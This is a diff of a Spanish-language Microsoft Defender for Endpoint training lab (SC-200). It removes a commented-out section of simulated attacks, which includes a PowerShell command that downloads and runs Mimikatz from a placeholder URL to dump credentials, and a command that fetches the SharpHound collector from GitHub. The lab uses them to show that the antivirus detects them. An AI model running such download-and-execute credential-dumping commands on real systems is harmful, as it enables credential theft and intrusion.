@@ -45,45 +45,6 @@ En esta tarea, confirmarás que el dispositivo se ha incorporado correctamente y
 
 >**Nota:** El laboratorio de evaluación y la sección Tutoriales y simulaciones del portal ya no están disponibles. Los pasos siguientes se proporcionan solo como referencia. Consulte la **[simulación interactiva de laboratorio](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** para obtener una demostración de los ataques simulados. Estamos trabajando para encontrar un reemplazo de los ataques simulados.
 
-<!--- In this task, you will run two *simulated* attacks using *PowerShell* on *WIN1* to explore the capabilities of Microsoft Defender for Endpoint.
-
-`Attack 1: Mimikatz - Credential Dumping`
-
-1. On the *WIN1* machine, type **Command** in the search bar and select **Run as administrator**.
-
-1. Copy and paste the following command in the **Administrator: Command Prompt** window and press **Enter** to run it.
-
-    ```CommandPrompt
-    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
-    ```
-
-1. You should see a message that says *Access is denied*, and a pop-up message from `Microsoft Defender Antivirus, Windows Security Virus and threats protection` displaying *Threats found*.
-
-1. Exit the **Administrator: Command Prompt** window by typing **exit** and pressing **Enter**.
-
-`Attack 2: Bloodhound - Collection`
-
-1. On the *WIN1* machine, type **PowerShell** in the search bar, select **Windows PowerShell** and select **Run as administrator**.
-
-1. Copy and paste the following commands in the **Administrator: Windows PowerShell** window and press **Enter** to run it.
-
-    ```PowerShell
-    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
-    ```
-
-    >**Note:** It is recommended to copy, paste and run the commands one at a time. You can open *Notepad* and copy the commands into a temporary file to accomplish this. The first command creates a folder named *ExternalPayloads* in the same folder where the *Atomic Red Team* folder is located. The second command downloads the *SharpHound.ps1* file from the *BloodHound* GitHub repository and saves it in the *ExternalPayloads* folder.
-
-1. You should see a  pop-up message from `Windows Security Virus and threats protection` displaying *Threats found*.
-
-1. Copy and paste the following command in the **Administrator: Windows PowerShell** window and press **Enter** to run it.
-
-    ```PowerShell
-    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
-    ```
-
-1. If the output is *True*, the Malware payload file has not been removed by Microsoft Defender Antivirus. If the output is *False*, the Malware payload file has been removed by Microsoft Defender Antivirus. Use the up-arrow key to repeat the command until the output is *False*. --->
-
 1. En el menú izquierdo, en **Puntos de conexión**, selecciona **Evaluación y tutoriales** y después, selecciona **Tutoriales y simulaciones** en el lado izquierdo.
 
 1. Selecciona la pestaña **Tutoriales**.
@@ -92,7 +53,7 @@ En esta tarea, confirmarás que el dispositivo se ha incorporado correctamente y
 
 1. En la nueva pestaña del explorador, busca la sección denominada **Ejecutar la simulación** (página 5, a partir del paso 2) y siga los pasos para ejecutar el ataque. **Sugerencia:** el archivo de simulación *RS4_WinATP-Intro-Invoice.docm* se puede encontrar en el portal, justo debajo de **Leer el tutorial** que has seleccionado en el paso anterior, seleccionando el botón **Obtener archivo de simulación**.
 
-<!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
+    <!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
 
 ### Tarea 3: investigar los ataques
 
@@ -100,7 +61,7 @@ En esta tarea, confirmarás que el dispositivo se ha incorporado correctamente y
 
 1. Hay un nuevo incidente denominado "Varias familias de amenazas detectadas en un punto de conexión" en el panel derecho. Selecciona el nombre del incidente para cargar sus detalles.
 
-    >**Nota:** Debería ver las alertas *Bloodhound* y Mimikatz* en el panel **Alertas**. En **Activos/dispositivos**, el equipo *win1* ahora tendrá un **nivel de riesgo** con valor *Alto*.
+    <!---    >**Note:** You should see both *Bloodhound* and Mimikatz* alerts in the **Alerts** pane. In **Assets/Devices**, the *win1* computer will now have a **Risk level** of *High*. --->
 
 1. Selecciona el botón **Administrar incidente** y aparecerá una nueva hoja de ventana. 
 
